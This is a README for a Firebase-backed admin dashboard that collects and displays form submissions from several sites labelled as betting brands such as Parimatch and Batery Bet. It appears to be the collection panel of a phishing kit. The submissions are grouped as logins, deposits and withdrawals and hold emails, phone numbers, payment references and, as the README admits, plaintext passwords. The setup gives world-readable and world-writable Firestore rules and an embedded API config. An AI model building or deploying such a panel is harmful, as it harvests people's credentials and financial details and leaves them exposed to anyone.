# Submissions Hub · Admin Panel

A real-time, iOS-style dashboard for form submissions across all 5 sites. Pure client-side — Firebase Firestore is the backend.

## Files
- `index.html` — dashboard markup
- `styles.css` — iOS-style design system
- `app.js` — Firebase + UI logic

## Features
- 📊 **4 KPI cards**: total / today / active sites / this week
- 🌐 **Site breakdown** with horizontal bars (% of total) — click to filter
- 📈 **7-day activity sparkline** + event mix chips (deposits / withdrawals / logins / other)
- 🔍 **Live search** across email, mobile, amount, UTR, game ID, description
- 🗓 **Date range pills**: 24h / 7d / 30d / All
- 🏷 **Site pills** (auto-generated from data)
- 💵 **Type pills**: All / Logins / Deposits / Withdrawals / Other
- 🔢 **Sort** by newest / oldest / site
- ✅ **Bulk select + delete + export** with selection count bar
- 🪟 **Detail modal** with copy-all-fields and per-field copy buttons
- ⬇ **CSV export** (UTF-8 BOM, opens in Excel) — filtered or selected
- 🔔 **Sound alerts** on new submissions (toggle in header)
- 🆕 **Toast notification** on new data arrival
- 🎨 **Smooth animations**: card fade-in, modal scale, bar growth
- 📱 **Fully responsive**: works on phone, tablet, desktop

## Setup

### 1. Firestore rules (Firebase Console → Firestore → Rules)
```
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /submissions/{doc} {
      allow read, write, delete: if true;
    }
  }
}
```

### 2. Firebase config is already wired
All 6 JS files (5 sites + admin panel) share this config:
```
const FIREBASE_CONFIG = {
  apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
  authDomain: "alll-projects-admin-pennal.firebaseapp.com",
  projectId: "alll-projects-admin-pennal",
  storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
  messagingSenderId: "689297868215",
  appId: "1:689297868215:web:2747b19c2da47a31f49432"
};
```

### 3. Open / host
- **Local**: just double-click `index.html`
- **Host**: upload the 3 files (`index.html`, `styles.css`, `app.js`) to any static host (Netlify, Vercel, GitHub Pages, Firebase Hosting, regular cPanel). No build step needed.

## Site IDs in the dashboard
| Site ID | Label |
|---|---|
| `1up_game` | 🎮 1UP Game |
| `batery_bet` | 🔋 Batery Bet |
| `crorebet` | 🪙 CroreBet |
| `odds96` | 🎯 ODDS96 |
| `parimatch` | 🏆 Parimatch |
| `topx_game` | ⚡️ TOPX Game |

Submissions from each site are tagged with their `site_id` automatically — the dashboard groups everything by site and shows the breakdown.

## Security note
The 5 sites collect email, mobile, **plaintext passwords** and financial data. The Firestore rules above make all submissions publicly readable to anyone with the project ID. Treat this setup as a demo only.

For production: hash passwords, add captcha, never store PII in plain Firestore, add Firebase App Check.
